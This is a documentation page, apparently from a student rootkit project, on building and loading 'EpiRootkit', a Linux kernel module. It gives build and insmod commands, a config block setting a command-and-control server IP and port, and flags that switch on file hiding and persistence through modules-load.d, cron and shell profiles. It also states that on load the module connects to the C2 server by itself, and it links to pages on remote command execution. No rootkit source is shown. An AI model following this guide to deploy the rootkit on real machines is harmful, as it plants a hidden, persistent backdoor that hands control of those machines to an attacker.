---
title: "Build & Deployment"
description: "How to build and load EpiRootkit on Ubuntu 20.04"
icon: "code"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 43
---

# Build & Deployment

How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.

## Requirements

### System
- **OS**: Ubuntu 20.04 LTS
- **Kernel**: 5.4.0-* (check with `uname -r`)
- **Architecture**: x86_64

### Dependencies
```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)
```

## Build Process

### 1. Navigate to Rootkit Directory
```bash
cd rootkit
```

### 2. Build the Module
```bash
make clean && make
```

**Expected output:**
```
make -C /lib/modules/5.4.0-74-generic/build M=/path/to/rootkit modules
  CC [M]  /path/to/rootkit/core/main.o
  CC [M]  /path/to/rootkit/commands/commands.o
  CC [M]  /path/to/rootkit/commands/auth_commands.o
  CC [M]  /path/to/rootkit/commands/exec_commands.o
  CC [M]  /path/to/rootkit/commands/file_commands.o
  CC [M]  /path/to/rootkit/commands/status_commands.o
  CC [M]  /path/to/rootkit/commands/stealth_commands.o
  CC [M]  /path/to/rootkit/network/connection.o
  CC [M]  /path/to/rootkit/network/socket.o
  CC [M]  /path/to/rootkit/network/keepalive.o
  CC [M]  /path/to/rootkit/stealth/stealth.o
  CC [M]  /path/to/rootkit/persistence/persistence.o
  CC [M]  /path/to/rootkit/security/auth.o
  CC [M]  /path/to/rootkit/utils/utils.o
  LD [M]  /path/to/rootkit/epirootkit.ko
```

### 3. Verify Build
```bash
ls -la epirootkit.ko
file epirootkit.ko
```

Should show: `ELF 64-bit LSB relocatable, x86-64`

## Configuration

### Network Settings
Edit `rootkit/core/config.h` before building:

```c
#define C2_SERVER_IP "192.168.64.1"    // Your C2 server IP
#define C2_SERVER_PORT 4444             // C2 server port
```

### Feature Settings
```c
#define ENABLE_ENCRYPTION 0      // Encryption disabled
#define ENABLE_PERSISTENCE 1     // Auto-install persistence
#define ENABLE_FILE_HIDING 1     // Hide files with prefixes
```

## Loading the Module

### Load Rootkit
```bash
sudo insmod epirootkit.ko
```

### Verify Loading
```bash
# Check if loaded (may be hidden if stealth enabled)
lsmod | grep epirootkit

# Check kernel messages
dmesg | tail -10
```

**Expected kernel messages:**
```
[  123.456] EpiRootkit: Starting initialization (v1.0.0)
[  123.457] EpiRootkit: Connection module initialized
[  123.458] EpiRootkit: Stealth module initialized
[  123.459] EpiRootkit: Persistence module initialized
[  123.460] EpiRootkit: All subsystems initialized successfully
[  123.461] EpiRootkit: Attempting connection to 192.168.64.1:4444
```

## Automatic Features

When the module loads, it automatically:

1. **Connects to C2 server** (if running)
2. **Installs persistence** (modules-load.d, cron, shell profiles)
3. **Enables file hiding** (hides files with specific prefixes)
4. **Starts keepalive system** (60-second ping/pong)

## Module Management

### Unload Module
```bash
sudo rmmod epirootkit
```

### Remove Persistence
```bash
# Remove all persistence mechanisms
sudo rm -f /etc/modules-load.d/epirootkit.conf
sudo rm -f /etc/cron.d/epirootkit
sudo rm -f /etc/profile.d/epirootkit.sh
```

### Clean Build
```bash
make clean
```

## Troubleshooting

### Build Errors

**Missing headers:**
```bash
sudo apt install linux-headers-$(uname -r)
```

**Wrong kernel version:**
```bash
uname -r  # Must be 5.4.0-*
```

### Loading Errors

**Check detailed errors:**
```bash
dmesg | grep -i error
```

**Module info:**
```bash
modinfo epirootkit.ko
```

### Connection Issues

**Check C2 server:**
```bash
netstat -tulpn | grep 4444
```

**Verify IP configuration:**
```bash
grep C2_SERVER_IP rootkit/core/config.h
```

## File Structure

After building, you'll have:
```
rootkit/
├── epirootkit.ko          # Main kernel module
├── Module.symvers         # Symbol versions
├── modules.order          # Module order
├── *.o                    # Object files
└── .*.cmd                 # Build commands
```

## Next Steps

1. **[Start C2 Server](../03-attacking-program/overview.md)**: Set up command & control
2. **[Authentication](./connection-authentication.md)**: Connect and authenticate
3. **[Use Commands](./features/command-execution.md)**: Execute remote commands

